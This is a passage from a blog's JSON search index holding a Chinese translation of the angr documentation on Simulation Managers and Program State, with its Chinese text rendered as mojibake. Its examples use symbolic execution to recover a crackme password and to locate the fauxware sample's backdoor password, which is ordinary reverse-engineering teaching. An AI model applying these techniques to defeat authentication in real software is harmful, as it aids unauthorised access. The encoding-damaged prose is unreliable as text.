å¹¶ä¸å…³å¿ƒç¨‹åºæ§åˆ¶æµåªæƒ³å•æ­¥æ‰§è¡Œåˆ°ç»“æŸæ—¶ï¼Œå¯ä»¥ä½¿ç”¨.run()æ–¹æ³• # è¿è¡Œç›´åˆ°ç¬¬ä¸€ä¸ªç¬¦å·åˆ†æ”¯ \u003e\u003e\u003e while len(simgr.active) == 1: ... simgr.step() \u003e\u003e\u003e simgr \u003cSimulationManager with 2 active\u003e \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400692\u003e, \u003cSimState @ 0x400699\u003e] # è¿è¡Œç›´åˆ°ç¨‹åºé€€å‡º \u003e\u003e\u003e simgr.run() \u003e\u003e\u003e simgr \u003cSimulationManager with 3 deadended\u003e æˆ‘ä»¬ç°åœ¨æœ‰3ä¸ªæŒ‚æ‰çš„çŠ¶æ€ï¼å½“ä¸€ä¸ªçŠ¶æ€åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ²¡æœ‰äº§ç”Ÿä»»ä½•åç»§çŠ¶æ€æ—¶ï¼Œä¾‹å¦‚ï¼Œç¨‹åºæ‰§è¡Œåˆ°äº†exitç³»ç»Ÿè°ƒç”¨ï¼Œè¿™ä¸ªçŠ¶æ€å°±ä¼šè¢«ä»activeå­˜å‚¨åŒºç§»é™¤æ”¾åˆ°deadendedå­˜å‚¨åŒºä¸­ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"å­˜å‚¨åŒºç®¡ç†ï¼ˆStash Managementï¼‰ è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨å…¶ä»–å­˜å‚¨åŒºã€‚ è¦åœ¨å­˜å‚¨åŒºä¹‹é—´ç§»åŠ¨ä¸€ä¸ªçŠ¶æ€ï¼Œå¯ä»¥ä½¿ç”¨.move()æ–¹æ³•ï¼Œå‚æ•°ä¸ºfrom_stash``to_stashå’Œfilter_funcï¼ˆå¯é€‰çš„ï¼Œé»˜è®¤æ˜¯ç§»åŠ¨ä¸€åˆ‡ï¼‰ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç§»åŠ¨è¾“å‡ºä¸­åŒ…å«çƒ­æŒ‡å®šå­—ç¬¦ä¸²çš„stateï¼š \u003e\u003e\u003e simgr.move(from_stash='deadended', to_stash='authenticated', filter_func=lambda s: b'Welcome' in s.posix.dumps(1)) \u003e\u003e\u003e simgr \u003cSimulationManager with 2 authenticated, 1 deadended\u003e æˆ‘ä»¬åœ¨ç§»åŠ¨æŒ‡å®šstateçš„åŒæ—¶ï¼Œåˆ›å»ºäº†ä¸€ä¸ªå«â€œauthenticatedâ€çš„å­˜å‚¨åŒºã€‚å­˜å‚¨åŒºä¸­æ¯ä¸ªstateåœ¨å…¶æ ‡å‡†è¾“å‡ºä¸­éƒ½æœ‰â€œWelcomeâ€ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åšæ³•ã€‚ æ¯ä¸ªå­˜å‚¨åŒºéƒ½åªæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹è¡¨ç´¢å¼•æˆ–è¿­ä»£è®¿é—®æ¯ä¸ªå•ç‹¬çš„stateï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›æ–¹æ³•å¯ä»¥æ›¿ä»£ä½¿ç”¨ã€‚å¦‚æœä½ åœ¨å­˜å‚¨åŒºåå‰åŠ ä¸€ä¸ªone_å‰ç¼€ï¼Œä½ å°†å¾—åˆ°å­˜å‚¨åŒºä¸­çš„ç¬¬ä¸€ä¸ªstateã€‚å¦‚æœä½ åœ¨å­˜å‚¨åŒºåå‰åŠ ä¸€ä¸ªmp_å‰ç¼€ï¼Œä½ å°†å¾—åˆ°è¯¥å­˜å‚¨åŒºçš„mulpyplexedç‰ˆæœ¬ \u003e\u003e\u003e for s in simgr.deadended + simgr.authenticated: ... print(hex(s.addr)) 0x1000030 0x1000078 0x1000078 \u003e\u003e\u003e simgr.one_deadended \u003cSimState @ 0x1000030\u003e \u003e\u003e\u003e simgr.mp_authenticated MP([\u003cSimState @ 0x1000078\u003e, \u003cSimState @ 0x1000078\u003e]) \u003e\u003e\u003e simgr.mp_authenticated.posix.dumps(0) MP(['\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00', '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80\\x80@\\x80@\\x00']) å½“ç„¶ï¼Œstep``runå’Œå…¶ä»–æ“ä½œå•ä¸ªå­˜å‚¨åŒºçš„æ–¹æ³•éƒ½å¯ä»¥æºå¸¦ä¸€ä¸ªstashå‚æ•°ï¼ŒæŒ‡æ˜æ˜¯å¯¹é‚£ä¸ªå­˜å‚¨åŒºæ“ä½œ simulation managerä¸ºä½ æä¾›äº†è®¸å¤šæœ‰è¶£çš„å·¥å…·æ¥ç®¡ç†å­˜å‚¨åŒºã€‚æˆ‘ä»¬æš‚æ—¶ä¸ä¼šè®¨è®ºå…¶ä»–å†…å®¹ï¼Œä½ å¯ä»¥æŸ¥çœ‹APIæ–‡æ¡£äº†è§£ç»†èŠ‚ã€‚ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"å­˜å‚¨åŒºç±»å‹ï¼ˆStash typesï¼‰ ä½ å¯ä»¥ä»»æ„ä½¿ç”¨å­˜å‚¨åŒºï¼Œä½†æœ‰ä¸€äº›å­˜å‚¨åŒºè¢«ç”¨æ¥å¯¹æŸäº›ç‰¹æ®Šç±»å‹çš„çŠ¶æ€è¿›è¡Œåˆ†ç±»ã€‚ activeï¼šæ­¤å­˜å‚¨å™¨åŒ…å«é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨stepæ–¹æ³•ä¼šè¢«æ‰§è¡Œçš„stateï¼Œé™¤éç‰¹åˆ«æŒ‡å®šäº†å­˜å‚¨åŒº deadendedï¼šå½“ä¸€ä¸ªstateç”±äºæŸç§åŸå› ä¸èƒ½ç»§ç»­æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šè¿›å…¥deadendedå­˜å‚¨åŒºï¼ŒåŒ…æ‹¬æ²¡æœ‰æ›´å¤šæœ‰æ•ˆæŒ‡ä»¤ï¼Œæ‰€æœ‰åç»§çŠ¶æ€æ— è§£å’Œæ— æ•ˆçš„æŒ‡ä»¤æŒ‡é’ˆã€‚ prunedï¼šå½“ä½¿ç”¨LAZY_SOLVESæ—¶ï¼Œéå¿…è¦ä¸ä¼šæ£€æŸ¥çŠ¶æ€æ˜¯å¦æ»¡è¶³ã€‚å½“åœ¨LAZY_SOLVESå­˜åœ¨æ—¶çº¦æŸæ¡ä»¶ä¸æ»¡è¶³æ—¶ï¼Œstateä¼šéå†å±‚æ¬¡ç»“æ„ï¼Œæ‰¾åˆ°æœ€åˆä¸æ»¡è¶³çš„stateï¼Œè¯¥çŠ¶æ€çš„æ‰€æœ‰åç»§çŠ¶æ€éƒ½ä¼šè¢«å‰ªé™¤å¹¶æ”¾å…¥æ­¤å­˜å‚¨åŒºä¸­ unconstrainedï¼šå½“Simulation Managerçš„æ„é€ å‡½æ•°è¢«æŒ‡å®šsave_unconstrainedé€‰é¡¹æ—¶ï¼Œåˆ™å°†è¢«ç¡®å®šä¸ºä¸å—çº¦æŸçš„stateæ”¾åœ¨æ­¤å­˜å‚¨åŒº unsatï¼šå½“Simulation Managerçš„æ„é€ å‡½æ•°è¢«æŒ‡å®šsave_unsaté€‰é¡¹æ—¶ï¼Œåˆ™å°†è¢«ç¡®å®šä¸ºä¸æ»¡è¶³çº¦æŸï¼ˆæœ‰çŸ›ç›¾çº¦æŸï¼‰çš„stateæ”¾åœ¨æ­¤å­˜å‚¨åŒº è¿˜æœ‰ä¸€ä¸ªä¸æ˜¯å­˜å‚¨åŒºçš„stateåˆ—è¡¨ï¼šerroredï¼Œå¦‚æœåœ¨ç¬¦å·æ‰§è¡ŒæœŸé—´å‘ç”Ÿé”™è¯¯ï¼Œåˆ™stateå°†è¢«åŒ…è£…åœ¨ErrorRecordå¯¹è±¡ä¸­ï¼Œå…¶ä¸­åŒ…å«stateå’Œå®ƒå¼•å‘çš„é”™è¯¯ä¿¡æ¯ï¼Œç„¶åè¿™æ¡è®°å½•å°†è¢«æ’å…¥åˆ°erroredä¸­ã€‚ä½ å¯ä»¥é€šè¿‡record.stateè·å–é”™è¯¯å‘ç”Ÿä¹‹å‰çš„çŠ¶æ€ï¼Œé€šè¿‡record.errorå¾—åˆ°å¼•å‘çš„é”™è¯¯ï¼Œå¹¶ä¸”ä½ å¯ä»¥é€šè¿‡record.debug()åœ¨å¼•å‘é”™è¯¯çš„ä½ç½®å¯åŠ¨è°ƒè¯•shellï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å®è´µçš„è°ƒè¯•å·¥å…·ï¼ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:3:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"ç®€å•çš„ç¬¦å·æ‰§è¡Œæ¢ç´¢ï¼ˆSimple Explorationï¼‰ è¿ç”¨ç¬¦å·æ‰§è¡Œçš„ä¸€ä¸ªå¸¸è§çš„ç›®çš„æ˜¯å¾—åˆ°ç¨‹åºè¿è¡Œåˆ°ç‰¹å®šåœ°å€æ—¶çš„çŠ¶æ€ï¼ŒåŒæ—¶ä¸¢å¼ƒé€šè¿‡å¦ä¸€ä¸ªåœ°å€çš„æ‰€æœ‰çŠ¶æ€ï¼Œsimulation manageræœ‰è¿™ä¸ªæ¨¡å¼çš„å¿«æ·æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨explore()æ–¹æ³• å½“ä½¿ç”¨.explore()æ–¹æ³•å¹¶æºå¸¦findå‚æ•°æ—¶ï¼Œç¬¦å·æ‰§è¡Œå°†ä¸€ç›´è¿›è¡Œç›´åˆ°å¾—åˆ°ä¸æŸ¥æ‰¾æ¡ä»¶åŒ¹é…çš„çŠ¶æ€ï¼Œfindå‚æ•°å¯ä»¥æ˜¯æŸä¸ªåœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸäº›åœ°å€ç»„æˆçš„åˆ—è¡¨ï¼Œè¿˜å¯ä»¥æ˜¯æ¥å—stateå‚æ•°è¿”å›æ˜¯å¦æˆåŠŸçš„æ–­è¨€çš„å‡½æ•°ã€‚å½“activeå­˜å‚¨åŒºä¸­çš„ä»»ä½•çŠ¶æ€ä¸findçš„æ¡ä»¶åŒ¹é…æ—¶ï¼Œè¿™äº›stateä¼šè¢«æ”¾è¿›foundå­˜å‚¨åŒºï¼Œå¹¶ä¸”ä¸­æ­¢ç¬¦å·æ‰§è¡Œã€‚ä¹‹åä½ å¯ä»¥ç»§ç»­ç¬¦å·æ‰§è¡Œæ¢ç´¢foundå­˜å‚¨åŒºä¸­çš„çŠ¶æ€ï¼Œæˆ–è€…ä¸¢å¼ƒè¿™äº›çŠ¶æ€å¹¶ç»§ç»­å…¶ä»–çŠ¶æ€ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨avoidæŒ‡å®šä¸findç›¸åŒçš„æ¡ä»¶å‚æ•°ï¼Œå½“ä¸€ä¸ªçŠ¶æ€ç¬¦åˆavoidæ¡ä»¶æ—¶ï¼Œå®ƒä¼šè¢«æ”¾è¿›avoidå­˜å‚¨åŒºä¸­ï¼Œå¹¶ç»§ç»­æ‰§è¡Œã€‚æœ€ç»ˆï¼Œnum_findå‚æ•°æ§åˆ¶åœ¨angrç»“æŸä¹‹å‰åº”è¯¥æ‰¾åˆ°çš„çŠ¶æ€æ•°ï¼Œé»˜è®¤å€¼ä¸º1ã€‚å½“ç„¶ï¼Œå¦‚æœä½ åœ¨æ‰¾åˆ°è¶³å¤Ÿæ•°é‡æ»¡è¶³æ¡ä»¶çš„çŠ¶æ€ä¹‹å‰ç”¨å®Œäº†activeå­˜å‚¨åŒºä¸­æ‰€æœ‰çš„çŠ¶æ€ï¼Œåˆ™æ— è®ºå¦‚ä½•éƒ½ä¼šåœæ­¢æ‰§è¡Œã€‚ æˆ‘ä»¬ä»¥crackmeç¨‹åºä¸ºä¾‹ é¦–å…ˆï¼Œæˆ‘ä»¬è¦åŠ è½½è¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åº \u003e\u003e\u003e proj = angr.Project('examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a') ä¸‹ä¸€æ­¥ï¼Œåˆ›å»ºSimulation Manager \u003e\u003e\u003e simgr = proj.factory.simgr() ç°åœ¨ï¼Œæˆ‘ä»¬è¿›è¡Œç¬¦å·æ‰§è¡Œç›´åˆ°æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªçŠ¶æ€ç¬¦åˆæˆ‘ä»¬æŒ‡å®šçš„æ¡ä»¶ \u003e\u003e\u003e simgr.explore(find=lambda s: b\"Congrats\" in s.posix.dumps(1)) \u003cSimulationManager with 1 active, 1 found\u003e ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä»stateä¸­å¾—åˆ°flag \u003e\u003e\u003e s = simgr.found[0] \u003e\u003e\u003e print(s.posix.dumps(1)) Enter password: Congrats! \u003e\u003e\u003e flag = s.posix.dumps(0) \u003e\u003e\u003e print(flag) g00dJ0B! ååˆ†ç®€å•ï¼Œä¸æ˜¯å—ï¼Ÿ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:4:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"æ¢ç´¢æŠ€æœ¯ï¼ˆExpolration Techniquesï¼‰ angré™„å¸¦äº†å‡ ä¸ªå›ºå®šåŠŸèƒ½ï¼Œå¯ä»¥è®©ä½ è‡ªå®šä¹‰Simulation Managerçš„è¡Œä¸ºï¼Œè¿™äº›åŠŸèƒ½å«åšexpolration techniquesã€‚è‡³äºä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¢ç´¢æŠ€æœ¯ï¼Œä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯å¯ä»¥ä¿®æ”¹æ¢ç´¢ç¨‹åºçŠ¶æ€ç©ºé—´çš„æ¨¡å¼ï¼Œé»˜è®¤â€œä¸€æ¬¡æ‰§è¡Œæ‰€æœ‰æ“ä½œâ€ç­–ç•¥å®é™…ä¸Šæ˜¯å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œä½†æ˜¯é€šè¿‡æ¢ç´¢æŠ€æœ¯ï¼Œä½ å¯ä»¥å®ç°æ·±åº¦ä¼˜å…ˆæœç´¢ã€‚è¿™äº›æŠ€æœ¯çš„èƒ½åŠ›è¿œæ¯”è¿™ä¸ªä¾‹å­æ›´åŠ çµæ´»â€”â€”ä½ å¯ä»¥å®Œå…¨æ”¹å˜angræ‰§è¡Œçš„è¡Œä¸ºã€‚ç¼–å†™è‡ªå·±çš„æ¢ç´¢æŠ€æœ¯å°†åœ¨åé¢çš„ç« èŠ‚ä¸­ä»‹ç»ã€‚ è¦ä½¿ç”¨æ¢ç´¢æŠ€æœ¯ï¼Œè¯·è°ƒç”¨simgr.use_technique(tech)ï¼Œå…¶ä¸­techæ˜¯EXploration Techniqueå­ç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚angrå†…ç½®çš„æ¢ç´¢æŠ€æœ¯å¯ä»¥åœ¨angr.exploration_techniquesæ‰¾åˆ° ä¸‹é¢æ˜¯ä¸€äº›å†…ç½®æŠ€æœ¯çš„æ¦‚è§ˆï¼š DFSï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œactiveå­˜å‚¨åŒºåªå­˜æ”¾ä¸€ä¸ªstateï¼Œå…¶ä»–stateè¢«æ”¾å…¥deferredå­˜å‚¨åŒºç›´åˆ°activeå­˜å‚¨åŒºçš„stateç»ˆæ­¢æˆ–äº§ç”Ÿé”™è¯¯ Explorerï¼šè¿™ä¸ªæŠ€æœ¯å®ç°äº†.explore()æ–¹æ³•ï¼Œå¯ä»¥æŒ‡å®šexploreå’Œavoid LengthLimiterï¼šé™åˆ¶çŠ¶æ€é€šè¿‡è·¯å¾„çš„æœ€å¤§é•¿åº¦ LoopSeerï¼šä½¿ç”¨å¾ªç¯è®¡æ•°çš„åˆç†è¿‘ä¼¼å€¼æ¥æš‚æ—¶ä¸¢å¼ƒé€šè¿‡å¾ªç¯æ¬¡æ•°è¿‡å¤šçš„çŠ¶æ€ï¼Œå°†ä»–ä»¬æ”¾å…¥spinningå­˜å‚¨åŒºï¼Œå¦‚æœå…¶ä»–å¯è¡Œçš„çŠ¶æ€è¢«ç”¨å®Œï¼Œåˆ™é‡æ–°å°†ä»–ä»¬æ‹‰å‡ºä½¿ç”¨ ManualMergepointï¼šå°†ç¨‹åºä¸­ä¸€ä¸ªåœ°å€æ ‡è®°ä¸ºåˆå¹¶ç‚¹ï¼Œåˆ°è¾¾è¯¥åœ°å€çš„çŠ¶æ€å°†è¢«æš‚æ—¶ä¿å­˜ï¼Œå¹¶ä¸”åœ¨è¶…æ—¶æ—¶é—´å†…åˆ°è¾¾åŒä¸€ç‚¹çš„å…¶ä»–çŠ¶æ€éƒ½å°†è¢«åˆå¹¶åœ¨ä¸€èµ·ã€‚ MemoryWatcherï¼šç›‘æ§simgræ‰§è¡Œè¿‡ç¨‹ä¸­ç³»ç»Ÿå†…å­˜ç©ºé—²ï¼Œå¦‚æœå˜å¾—å¤ªä½ï¼Œåˆ™åœæ­¢æ‰§è¡Œ Oppologistï¼šâ€œoperation apologistâ€æ˜¯ä¸€ä¸ªç‰¹åˆ«æœ‰è¶£çš„å°å·¥å…·â€”â€”å¦‚æœå¯ç”¨æ­¤æŠ€æœ¯å¹¶ä¸”angré‡åˆ°ä¸å—æ”¯æŒçš„æŒ‡ä»¤ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªå¥‡æ€ªçš„å¤–æ¥æµ®ç‚¹SIMDæ“ä½œï¼Œå®ƒä¼šå°†æ‰€æœ‰è¾“å…¥å…·ä½“åŒ–å¹¶ä½¿ç”¨unicornå¼•æ“æ¨¡æ‹Ÿå•ä¸ªæŒ‡ä»¤ï¼Œä»è€Œå…è®¸ç»§ç»­æ‰§è¡Œ Spillerï¼šå½“activeå­˜å‚¨åŒºçŠ¶æ€è¿‡å¤šæ—¶ï¼Œæ­¤æŠ€æœ¯å¯ä»¥å°†å…¶ä¸­ä¸€äº›çŠ¶æ€è½¬å­˜åˆ°ç£ç›˜ä»¥ä¿æŒè¾ƒä½çš„å†…å­˜æ¶ˆè€— Threadingï¼šå°†çº¿ç¨‹çº§å¹¶è¡Œæ€§æ·»åŠ åˆ°æ‰§è¡Œè¿‡ç¨‹ã€‚ç”±äºpythonçš„å…¨å±€è§£é‡Šå™¨é”ï¼Œè¿™å¹¶æ²¡æœ‰å¤šå¤§å¸®åŠ©ï¼Œä½†æ˜¯å¦‚æœä½ æœ‰ä¸€ä¸ªç¨‹åºçš„åˆ†æèŠ±è´¹å¤§é‡æ—¶é—´åœ¨angrçš„æœ¬æœºä»£ç ä¾èµ–é¡¹ï¼ˆunicornã€z3ã€libvexï¼‰ä¸­ï¼Œä½ å¯èƒ½ä¼šè·å¾—ä¸€äº›æ”¶ç›Š Tracerï¼šä¸€ç§æ¢ç´¢æŠ€æœ¯ï¼Œå®ƒä½¿ç¬¦å·æ‰§è¡Œéµå¾ªä»å…¶ä»–æ¥æºè®°å½•çš„åŠ¨æ€è·Ÿè¸ªã€‚åŠ¨æ€è·Ÿè¸ªå™¨å­˜å‚¨åº“æœ‰ä¸€äº›å·¥å…·å¯ä»¥ç”Ÿæˆè¿™äº›è·Ÿè¸ª Veritestingï¼šå…³äºè‡ªåŠ¨è¯†åˆ«æœ‰ç”¨åˆå¹¶ç‚¹çš„CMUè®ºæ–‡çš„å®ç°ï¼Œå®ƒååˆ†æœ‰ç”¨ï¼Œä½ å¯ä»¥åœ¨æ„é€ Simulation Manageræ—¶ä½¿ç”¨veritesting=Trueå‚æ•°æ¥å¼€å¯è¿™ä¸ªæŠ€æœ¯ï¼è¯·æ³¨æ„ï¼Œç”±äºå®ƒå®ç°çš„æ˜¯é™æ€ç¬¦å·æ‰§è¡Œçš„ä¾µå…¥æ€§æ–¹å¼ï¼Œå®ƒé€šå¸¸ä¸èƒ½ä¸å…¶ä»–æŠ€æœ¯é…åˆä½¿ç”¨ã€‚ æŸ¥çœ‹Simulation Managerå’Œæ¢ç´¢æŠ€æœ¯çš„APIæ–‡æ¡£ä»¥è·å–æ›´å¤šä¿¡æ¯ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:5:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"Program State åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªä½¿ç”¨äº†angrçš„ç¨‹åºçŠ¶æ€æ¨¡æ‹Ÿï¼ˆSimState objectsï¼‰ï¼Œä»¥æœ€ç®€å•çš„æ–¹å¼å±•ç¤ºäº†æœ‰å…³angrçš„åŸºæœ¬æ“ä½œã€‚è¿™ä¸€èŠ‚ä¸­ï¼Œä½ å°†äº†è§£stateå¯¹è±¡çš„ç»“æ„ä»¥åŠå¦‚ä½•ä¸stateäº¤äº’ã€‚ ","date":"2022-09-14","objectID":"/2022/09/program_state/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"å›é¡¾ï¼šè¯»å†™å†…å­˜å’Œå¯„å­˜å™¨ï¼ˆReview: Reading and writing memory and registersï¼‰ å¦‚æœä½ æŒ‰é¡ºåºè¯»äº†è¯¥æ–‡æ¡£ä¹‹å‰çš„å†…å®¹ï¼ˆä½ ä¹Ÿåº”è¯¥è¿™æ ·åšï¼Œè‡³å°‘åº”è¯¥æŒ‰é¡ºåºè¯»å®Œç¬¬ä¸€éƒ¨åˆ†ï¼‰ï¼Œä½ å·²ç»äº†è§£äº†è®¿é—®å†…å­˜å’Œå¯„å­˜å™¨çš„åŸºæœ¬æ“ä½œï¼Œstate.regsæ¥å—å¯„å­˜å™¨åç§°ä½œä¸ºå‚æ•°å¯ä»¥å¯¹å¯„å­˜å™¨è¿›è¡Œè¯»å†™ï¼Œstate.memå¯ä»¥ç”¨åœ°å€ä½œä¸ºç´¢å¼•è·å–ç›¸åº”åœ°å€çš„å€¼ï¼Œç´¢å¼•åå¯ä»¥æŒ‡å®šæ•°æ®ç±»å‹ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š \u003e\u003e\u003e import angr, claripy \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e state = proj.factory.entry_state() # æŠŠrspçš„å€¼å¤åˆ¶åˆ°rbp \u003e\u003e\u003e state.regs.rbp = state.regs.rsp # æŠŠrdxçš„å€¼å­˜åˆ°åœ°å€ä¸º0x1000å†…å­˜ä¸­ \u003e\u003e\u003e state.mem[0x1000].uint64_t = state.regs.rdx # æ”¹å˜rbpæ‰€æŒ‡å‘çš„åœ°å€ \u003e\u003e\u003e state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved # add rax, qword ptr [rsp + 8] \u003e\u003e\u003e state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved ","date":"2022-09-14","objectID":"/2022/09/program_state/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"åŸºç¡€æ‰§è¡Œï¼ˆBasic Executionï¼‰ æ—©äº›æ—¶å€™ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨Simulation Manageræ¥è¿›è¡Œä¸€äº›åŸºæœ¬çš„æ‰§è¡Œã€‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚å±•ç¤ºSimulation Managerçš„å…¨éƒ¨åŠŸèƒ½ï¼Œä½†æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨ä¸€ç§å„ç®€å•çš„æ¥å£state.step()æ¥æ¼”ç¤ºç¬¦å·æ‰§è¡Œçš„å·¥ä½œåŸç†ã€‚è¿™ä¸ªæ¥å£ä¼šè¿›è¡Œä¸€æ­¥ç¬¦å·æ‰§è¡Œï¼Œå¹¶è¿”å›ä¸€ä¸ªSimSuccessorså¯¹è±¡ã€‚ä¸ä¸€èˆ¬çš„æ¨¡æ‹Ÿæ‰§è¡Œç›¸æ¯”ï¼Œç¬¦å·æ‰§è¡Œå¯ä»¥äº§ç”Ÿå¤šä¸ªå¯ä»¥æŒ‰å¤šç§æ–¹å¼åˆ†ç±»çš„åç»§çŠ¶æ€ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„.successorså±æ€§ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªåŒ…å«ç»™å®šæ­¥éª¤çš„æ‰€æœ‰â€œæ­£å¸¸â€åç»­çŠ¶æ€çš„åˆ—è¡¨ã€‚ ä¸ºä»€ä¹ˆè¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå”¯ä¸€çš„åç»§çŠ¶æ€ï¼Ÿangrçš„ç¬¦å·æ‰§è¡Œè¿‡ç¨‹åªæ˜¯å°†å•ä¸ªæŒ‡ä»¤çš„æ“ä½œç¼–è¯‘åˆ°ç¨‹åºä¸­å¹¶æ‰§è¡Œå®ƒä»¬ä»¥æ”¹å˜SimStateã€‚å½“é‡åˆ°åƒif(x\u003e4)è¿™æ ·çš„ä»£ç æ—¶ï¼Œå¦‚æœxæ˜¯ç¬¦å·å˜é‡ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿåœ¨angrçš„åº•å±‚æŸä¸ªåœ°æ–¹ï¼Œä¼šå¤„ç†x\u003e4è¯­å¥ï¼Œç»“æœå°†æ˜¯\u003cBool x_32_1 \u003e 4\u003e è¿™å¾ˆå¥½ï¼Œä½†ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ˜¯é€‰æ‹©â€œtrueâ€åˆ†æ”¯è¿˜æ˜¯â€œfalseâ€åˆ†æ”¯ï¼Ÿç­”æ¡ˆæ˜¯ï¼šä¸¤ä¸ªåˆ†æ”¯éƒ½ä¼šè¢«æ‰§è¡Œï¼Œäº§ç”Ÿä¸¤ä¸ªå®Œå…¨ç‹¬ç«‹çš„åç»§çŠ¶æ€ã€‚åœ¨ç¬¬ä¸€ä¸ªstateä¸­ï¼Œæˆ‘ä»¬æ·»åŠ x\u003e4ä½œä¸ºçº¦æŸæ¡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªstateä¸­ï¼Œæˆ‘ä»¬æ·»åŠ !(x\u003e4)ä½œä¸ºçº¦æŸæ¡ä»¶ã€‚æ¯å½“æˆ‘ä»¬ä½¿ç”¨è¿™äº›åç»§çŠ¶æ€ä¸­çš„ä»»ä½•ä¸€ä¸ªè¿›è¡Œçº¦æŸæ±‚è§£æ—¶ï¼ŒçŠ¶æ€çš„æ¡ä»¶ç¡®ä¿æˆ‘ä»¬å¾—åˆ°çš„ä»»ä½•æœ‰æ•ˆå€¼éƒ½æ˜¯æœ‰æ•ˆçš„è¾“å…¥ï¼Œè¿™å°†å¯¼è‡´é‡å¤æ‰§è¡Œéµå¾ªç»™å®šçŠ¶æ€çš„è·¯å¾„ ä¸ºäº†è¯æ˜è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬ä»¥fake firmware imagesä¸ºä¾‹ï¼Œå¦‚æœä½ æŸ¥çœ‹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„æºä»£ç ï¼Œä½ ä¼šå‘ç°å›ºä»¶çš„èº«ä»½éªŒè¯æœºåˆ¶æ˜¯å­˜åœ¨åé—¨çš„ï¼šä»»ä½•ç”¨æˆ·åéƒ½å¯ä»¥é€šè¿‡å¯†ç â€œSOSNEAKYâ€è·å¾—ç®¡ç†å‘˜æƒé™ã€‚æ›´è¿›ä¸€æ­¥æ¥è¯´ï¼Œä¸ç”¨æˆ·è¾“å…¥çš„æ¯”è¾ƒå°±æ˜¯å­˜åœ¨åé—¨çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å•æ­¥æ‰§è¡Œè¿›è¡Œæ¯”è¾ƒï¼Œè·å¾—å¤šä¸ªåç»§çŠ¶æ€ã€‚å…¶ä¸­ä¸€ç§çŠ¶æ€å°†åŒ…å«å°†ç”¨æˆ·è¾“å…¥é™åˆ¶ä¸ºåé—¨å¯†ç çš„æ¡ä»¶ã€‚ä»¥ä¸‹ä»£ç ç‰‡æ®µå®ç°äº†è¿™ä¸€ç‚¹ï¼š \u003e\u003e\u003e proj = angr.Project('examples/fauxware/fauxware') 